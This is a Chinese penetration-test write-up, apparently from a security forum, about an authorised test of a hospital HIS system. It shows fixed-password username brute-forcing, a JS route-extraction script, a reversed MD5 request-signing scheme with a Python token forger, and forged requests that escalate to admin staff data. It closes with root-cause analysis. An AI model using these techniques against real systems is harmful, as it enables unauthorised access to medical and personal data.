# 记一次 HIS 系统垂直越权挖掘：从弱口令登录到垂直越权导致全量信息泄露
> 来源：https://xz.aliyun.com/news/92669

声明：本文所有测试均在授权范围内进行，涉及数据已脱敏处理，本文仅用于安全技术交流，严禁用于未授权渗透等违规违法行为。  
  

## 0x00 前言

  
一次攻防对抗项目中对某医院 HIS 系统的渗透，目标是验证登录用户权限边界并扩大战果。整个链路走下来很有意思：看似处处有鉴权，实则令牌签名可逆向，最终用一个低权限账号拿到了全量用户数据。  
  

## 0x01 登录框对抗

  

![1.png](https://i.im.ge/QMzuHZT/p2m-cdfe03b31f.png)

  
  
雪瞳收集了一些ID密钥，泄露的TextIn secret能利用，先捡个低危恰烂分。  
  

![3.png](https://i.im.ge/QMzukOW/p2m-e4d2a647b3.png)

  
  

![image.png](https://i.im.ge/QMzuvoc/p2m-364ad5568f.png)

  
  

### 1\. 指纹确认

  

```
系统: xx HIS
后端: Spring Boot 微服务 (msun-* 服务，nginx/elb 网关)
防护: CloudWAF+ 统一网关鉴权
前端: Vue SPA，登录页加载主 JS
```

### 2\. 弱口令突破

  

![4.png](https://i.im.ge/QMzuzm0/p2m-f78aac6b7e.png)

  
  
系统登录页尝试弱口令，发现密码进行了加密并且限制了登录失败次数，针对这种场景，可以采用固定密码爆破用户名的方式突破。  
  
像国内的很多OA、医疗系统、私有邮箱、协同办公以及一些内网系统很喜欢用姓名拼音或者工号来作为登录用户名。  
  
固定密码1qaz@WSX，爆破用户名，这里运气不错爆出一个用户名为dengli的账户  
  

![5.png](https://i.im.ge/QMzuVHr/p2m-df2d82b6ce.png)

  
  

```
账号: dengli（普通医生，血透科）    密码: 1qaz@WSX
```

登录后系统列表只显示 1 个应用（血液透析），角色为「血透医生」。  
  

## 0x02 JS 分析接口

  
拿到登录态后，先对系统做接口梳理。  
  

### 1\. JS分析

  
当前权限很低，F12分析JS，index-MQc5TDxM.js泄露了大量API路由  
  

![6.png](https://i.im.ge/QMzunYG/p2m-c2c9b1702e.png)

  
  

### 2\. 脚本提取全部接口

  
主 JS 是 webpack 打包的，接口调用模式很统一，写个正则脚本把所有 baseURL + 接口路径提取出来：  
  

```python
import re
src = open("index.js", encoding="utf-8", errors="ignore").read()
var_svc = {}
for m in re.finditer(r'([A-Za-z_$][\w$]*)=ln\.create\(\{baseURL:"([^"]+)"', src):
    var_svc[m.group(1)] = m.group(2)
for m in re.finditer(r'([A-Za-z_$][\w$]*?)\.(get|post|put|delete)\("(/[^"]+)"', src):
    svc = var_svc.get(m.group(1), "?")
    print(svc, m.group(2).upper(), m.group(3))
```

一口气提出来 160 个接口，覆盖用户/患者/账号/角色/菜单等模块。  
  

![接口.png](https://i.im.ge/QMzu4Bx/p2m-cd21c5d1cf.png)

  
  

### 3\. AI 辅助越权访问

  
接口多、参数未知，让 AI 根据接口语义猜测参数（userId、pageNum、hospitalId 等），脚本自动拼 URL 批量发包，接口均有鉴权。  
  

![7.png](https://i.im.ge/QMzueyJ/p2m-d9fd156a9f.png)

  
  
那么带着登录态的令牌呢？  
  
报错全变成了Token校验失败  
  

![8.png](https://i.im.ge/QMzuGaa/p2m-9c070fca33.png)

  
  
回头翻了翻burp的历史，发现每个数据包的令牌竟然是动态变化的？  
  

![9.png](https://i.im.ge/QMzuJhL/p2m-1c94406ab3.png)

  
  

![10.png](https://i.im.ge/QMzFrXF/p2m-5c5ec4cf2a.png)

  
  

## 0x03 分析令牌结构

  

### 1\. 观察 Authorization 长什么样

  
登录后抓一个正常请求，Authorization 头是这样的：  
  

```
NTkxYmVhYxxxxxc4Mi00NzA1LWIwYzgtYTQ5ZWE0MGRlOTRk.MTc4NjQxNzYzNzg3MQ==.bTdaREVmbFZObHVUTXpvRg==.NjFDQzM5RkNDOTMyQTk3RDRFQzBERjYxMzg3NDZBNTA=.xxxxxDIzMgA4MTEwNjU1MzAxxxxxxxxxeS/neWBpeW6t+WkjeenkemXqOivigA0NzU1ODUzMzAxODExNTEyMxxxxxxhgOa2sumAj+aekAA4ODQwNzg5NjAwMDYyMTUwNjU4AOihgOmAj+WMu+eUnw==
```

5 段 base64，用 `.` 分隔。逐段解码：  
  

| 段 | 解码内容 | 含义 |
| --- | --- | --- |
| 1 | 591beab3-2782-4705-........ | token（会话标识） |
| 2 | 1786417637871 | 时间戳（毫秒） |
| 3 | m7ZDEflV... | 16 位随机串 |
| 4 | 61CC39FCC932A97D4EC0DF6138746A50 | MD5 签名（32位 hex 大写） |
| 5 | 5000232�血透科�...�血透医生 | 用户信息（� 分隔） |

  
结构清晰：UUID.时间戳.随机串.MD5签名.用户信息。  
  

### 2\. 定位生成逻辑

  
在 JS 里搜 `Authorization` 的赋值：  
  

![11.png](https://i.im.ge/QMzFomz/p2m-8655987bef.png)

  
  

```javascript
e.headers.Authorization = Em(c, l, {
        method: n,
        query: Object.assign({}, d, r),
        data: s,
        selectedSystem: JSON.parse(!Jo() && sessionStorage.getItem("selectedSystem") || "null")
    }),
    e
```

找到了签名函数 `Em`，继续搜函数定义，提取完整实现：  
  

![12.png](https://i.im.ge/QMzFFb9/p2m-c9819b0200.png)

  
  

```javascript
function Em(e, t, n) {
    var o;
    const r = Date.now().toString()
      , s = Qm(16)
      , a = ( () => {
        if (!(n && "method"in n) || !["get", "post", "put", "delete", "patch"].includes(n.method.toLowerCase()))
            return "";
        const {query: d, data: u, method: m} = n;
        return d || u ? ["get", "delete"].includes(m.toLowerCase()) && d ? Object.keys(d).sort().reduce( (p, b) => ic(d[b]) && d[b] !== "" && (!Array.isArray(d[b]) || d[b].length !== 0) ? p + b + d[b] : p, "") : ["post", "put", "patch"].includes(m.toLowerCase()) && u ? u instanceof FormData ? "null" : typeof u == "string" ? u : JSON.stringify(u) : "" : ""
    }
    )()
      , i = n != null && n.selectedSystem ? {
        deptCode: n.selectedSystem.deptCode,
        deptId: n.selectedSystem.deptId,
        deptName: n.selectedSystem.deptName,
        systemId: (o = n.selectedSystem.sysytemId) != null ? o : n.selectedSystem.systemId,
        systemName: n.selectedSystem.systemName,
        userSysId: n.selectedSystem.userSysId,
        userSysName: n.selectedSystem.userSysName
    } : void 0
      , c = i && Object.values(i).every(Boolean) ? Object.values(i).join("\0") : void 0
      , l = $.MD5([e, r, s, a, t, c].filter(d => d !== void 0).join("")).toString().toUpperCase();
    return [e, r, s, l, c].filter(d => d !== void 0).map(d => cc(d)).join(".")
}
```

签名算法完全还原：  
  

```python
签名 = MD5(token + 时间戳 + 随机串 + 参数串 + secret + 用户信息串).upper()
```

这里让AI根据JS生成了一个令牌生成器  
  

```python
def gen_auth(token, secret, sys_fields, method, path, body):
    i = str(int(time.time() * 1000))     # 时间戳
    a = 16位随机串
    o = body if POST else GET参数串      # 参数串（签名绑定请求）
    l = "\0".join(sys_fields)            # 用户信息串
    c = hashlib.md5((token+i+a+o+secret+l).encode()).hexdigest().upper()
    return ".".join([b64(token), b64(i), b64(a), b64(c), b64(l)])
```

这里需要的secret、token全都在本地存储，用户信息串使用当前登录用户的信息。  
  

![13.png](https://i.im.ge/QMzFuhK/p2m-42f4a51fe9.png)

  
  

### 3\. 令牌验证

  
拿一个真实请求反推：`POST /msun-middle-base-staff/api/user/findByPage`  
  
`python get_token.py "591beab3-xxxx-4705-b0c8-a49ea40de94d|016xxxx499838496" POST "/msun-middle-base-staff/api/user/findByPage" '{"pageNum":1,"pageSize":5}'`  
  

![14.png](https://i.im.ge/QMzFXZ6/p2m-3d4c8bb272.png)

  
  

![15.png](https://i.im.ge/QMzF2a8/p2m-8379677954.png)

  
  
算法确认无误。 这意味着只要知道 `token+secret`，就能伪造任意请求的合法令牌。  
  

## 0x04 垂直越权

  
该系统 Authorization 分段令牌外观上以`.`分割多段 Base64 字符串，视觉上极易联想到 JWT 三段式结构，但底层设计、安全强度、校验逻辑和标准 JWT 存在本质区别，漏洞根源也全部来源于这套自研签名体系的缺陷。  
  
  
  
竟然已经可以伪造令牌了，直接尝试垂直越权  
  
这里选择接口`/msun-middle-base-staff/user/findIncludeStaffByPage`  
  
接口翻译为分页查询员工  
  
伪造jwt  
  
`python get_token.py "591beab3-xxxx-4705-b0c8-a49ea40de94d|0164999499838496" POST "/msun-middle-base-staff/user/findIncludeStaffByPage" '{"pageNum":1,"pageSize":30}'`  
  

![16.png](https://i.im.ge/QMzFOGX/p2m-4757dfac9e.png)

  
  
使用伪造的令牌访问接口，这里注意POST的body要和签名中的一致。  
  

![image.png](https://i.im.ge/QMzFSAh/p2m-b9bcd277a1.png)

  
  
成功越权获取大量医生、用户信息，同时其他接口也可伪造令牌进行越权  
  

### 4\. 思考：为什么能绕过去

  
对照服务端校验逻辑，真相清楚了：  
  

```
① 校验签名(六要素)   →  用合法 secret 算的，通过
② 校验 token 有效性 →  低权限账号真实存在
③ 校验接口权限(RBAC) → 管理接口根本没查权限
④ 校验数据范围      →  没做隔离，改pageSize直接返回全量
```

签名只证明了"是合法登录用户"，但系统不校验"该不该访问这个接口"。 前端隐藏了管理菜单，后端接口却裸奔——这就是垂直越权的本质。  
  

### 5\. 踩过的坑

  
● 签名绑定请求：POST 的参数串 = body 原始字符串。换 body 必须重新生成令牌，否则 9996  
● 令牌有时效：签名时间戳约 2-3 分钟过期，需脚本实时生成（这也是防重放设计，反而是安全加分项）  
● 后端验证用户：一开始的思路是修改令牌中的用户信息，但是用户信息后端会校验绑定的uid、科室id等信息，管理员的信息获取难度大，索性直接用低权限账户测越权  

## 0x05 漏洞根因

  
1 管理接口缺失 RBAC 接口级权限校验——只验登录态，不验接口权限，垂直越权  
2 secret 明文存前端——签名密钥随登录态下发，XSS/存储窃取即可完全接管  
3 详情接口缺对象级授权——可遍历任意员工（IDOR 横向放大）  

## 0x06 总结

  
这个系统"看似鉴权完善"（第一轮接口测试全被拦），实则签名密钥明文下发 + 管理接口无权限校验两处设计缺陷叠加，导致：  
  
●有 token+secret → 可伪造任意请求签名  
  
●低权限令牌 → 可直接调管理接口  
  
看似最难的"鉴权"反而是纸糊的。 对于渗透测试者，遇到带签名的自定义令牌，第一反应不该是硬爆破，而是：去 JS 里找签名算法，去逆向算法。这两步打通，鉴权体系基本就破了。  
  
本文记录于攻防对抗项目，过程已获授权，请勿用于非法用途。
